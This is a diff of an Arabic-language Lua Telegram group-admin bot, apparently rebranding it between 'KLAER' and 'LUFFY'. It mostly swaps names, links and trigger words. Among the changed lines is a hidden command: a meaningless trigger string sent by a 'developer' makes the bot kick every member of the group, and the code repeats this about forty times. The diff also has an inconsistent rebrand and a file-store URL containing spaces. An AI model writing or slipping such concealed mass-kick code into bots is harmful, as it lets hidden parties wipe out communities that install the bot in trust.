@@ -3841,7 +3837,7 @@ keyboard.inline_keyboard = {
 {text = '@Dlik', callback_data="/Dlik"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3929,7 +3925,7 @@ keyboard.inline_keyboard = {
 {text = '• الجوزاء 🌩', callback_data="/zguza"},{text = '• الدلو 🦯', callback_data="/zdlu"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3974,7 +3970,7 @@ end
 ----------------------------------------------------------------- انتهئ الاوامر الجديدة
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local Text = [[
-source LUFFYthe best tele 
+source LUFFY the best tele 
 we the best of tele  
 ]]
 keyboard = {} 
@@ -3984,36 +3980,40 @@ keyboard.inline_keyboard = {
 {{text = ' اضغط لاضافه البوت لمجموعتك ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sasa_boody&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Anime_ib&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'لوكاس' or text == 'مطور لوكاس' then
+if text == 'لوكاس' or text == 'لولو' or text == 'ملولو' or text == 'مطور لوكاس' then
 local Text = [[
-𝚃𝙷𝙴 𝙳𝙴𝚅 𝙻𝚄𝙲𝙰𝚂
- 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚃𝙴𝙻𝙴 
-𝚆𝙴 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝙾𝙵 𝚃𝙴𝙻𝙴
+the dev Lucas
+ source LUFFY the best tele 
+we the best of tele  
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'Lucas',url="t.me/il9_9li"}},
+{{text = 'القنوات', callback_data="/Ajobanf"},{text = 'الرومات', callback_data="/banfai"}},  
+{{text = 'البوتات', callback_data="/gqjik"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/901&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
  
- if text == 'فايدير' or text ==  'مطور فايدير' then
+ if text == 'فايدير' or text == 'فايدر' or text == 'فري' or text == 'مطور فايدير' then
 local Text = [[
 𝚃𝙷𝙴 𝙳𝙴𝚅 F A E D E R 
- 𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚃𝙴𝙻𝙴 
+ S0URCE LUFFY 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚃𝙴𝙻𝙴 
 𝚆𝙴 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝙾𝙵 𝚃𝙴𝙻𝙴
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'F A E D E R',url="t.me/jicco"}},
+{{text = 'F A E D E R',url="t.me/Jicco"}},
+{{text = 'القنوات', callback_data="/Ajobanf"},{text = 'الرومات', callback_data="/banfai"}},  
+{{text = 'البوتات', callback_data="/gqjik"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/952&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/926&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 
@@ -4023,288 +4023,288 @@ send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك؟ \n ● للخ�
 return false
 end
 if text == "£¢€$$__€€¢¥^^" and Developers(msg) then
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
 end,nil)
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,KLAER)
-local list = KLAER.members_
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,LUFFY)
+local list = LUFFY.members_
 for k, v in pairs(list) do
 if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
@@ -4376,13 +4376,13 @@ local vBoodyv_Msg = {
 "اخر اغنية سمعتها ?", 
 "تكلم عن نفسك", 
 "ليه انت مش سالك", 
-"ما هيا عيوب سورس لوفي؟ ", 
+"ما هيا عيوب سورس كلير؟ ", 
 "اخر كتاب قرآته", 
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
 "ليه فايدير جدع؟ ", 
- "ليه صاصا جدع؟ ", 
+ "ليه لولو جدع؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -4393,13 +4393,13 @@ local vBoodyv_Msg = {
 " ما السيء في هذه الحياة ؟ ", 
 "أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
 "سؤال ينرفزك ؟ ", 
-" هل يعجبك سورس لوفي؟؟ ", 
+" هل يعجبك سورس كلير؟؟ ", 
 " اكثر ممثل تحبه ؟ ", 
 "قد تخيلت شي في بالك وصار ؟ ", 
 "شيء عندك اهم من الناس ؟ ", 
 "تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
 "وش أخر شي ضيعته؟ ", 
-"اي رايك في سورس لوفي؟ ", 
+"اي رايك في سورس كلير؟ ", 
 "كم مره حبيت؟ ", 
 " اكثر المتابعين عندك باي برنامج؟", 
 " نسبه الندم عندك للي وثقت فيهم ؟", 
@@ -5092,25 +5092,25 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 end
 if text == 'قناة السورس' then
 local Text = [[ 
-[قناه سورس لوفي ادخل وتابع الجديد](t.me/Anime_ib)
+[قناه سورس كلير ادخل وتابع الجديد](t.me/Anime_ib)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}}, 
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '●○━━━━LUFFY━━━━○●' then
 local Text = [[ 
- ●من أحسن السورسات على التليجرام سورس لوفي●
+ ●من أحسن السورسات على التليجرام سورس كلير●
 بجد سورس أمان جدا وفي مميزات جامده
 تع نصب بوتك عندنا لو محظور
 خش على تواصل هيدخلك لروم التواصل 
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}}, 
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -5128,9 +5128,9 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == 'العاب لوفي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
+if text == 'العاب كلير' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
 local Text = [[  
- ● اهلا في قائمه الالعاب المتطوره سورس لوفي● 
+ ● اهلا في قائمه الالعاب المتطوره سورس كلير● 
 تفضل اختر لعبه من القائمه 
 ]]  
 keyboard = {}   
@@ -5160,14 +5160,14 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}},
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'تحديث' and Devban(msg) then    
-dofile('KLAER.lua')  
+dofile('LUFFY.lua')  
 send(msg.chat_id_, msg.id_, ' ● تم تحديث جميع الملفات') 
 end 
 if text == ("مسح قائمه العام") and Devban(msg) then
@@ -7248,7 +7248,7 @@ send(msg.chat_id_, msg.id_, "\n ● تم مسح قائمة المطورين  ")
 end
 
 if text == 'الملفات' and Devban(msg) then
-t = ' ● ملفات السورس لوفي↓\n ●○━━━━LUFFY━━━━○● \n'
+t = ' ● ملفات السورس كلير↓\n ●○━━━━LUFFY━━━━○● \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
@@ -7260,13 +7260,13 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if Devban(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n ● اهلا بك في متجر ملفات لوفي\n ● ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
-local TextE = "\n●○━━━━LUFFY━━━━○●\n ● علامة تعني { ✔️ } ملف مفعل\n ● علامة تعني { ✖ } ملف معطل\n ● قناة سورس لوفي↓\n".." ● [اضغط هنا لدخول](t.me/Anime_ib) \n"
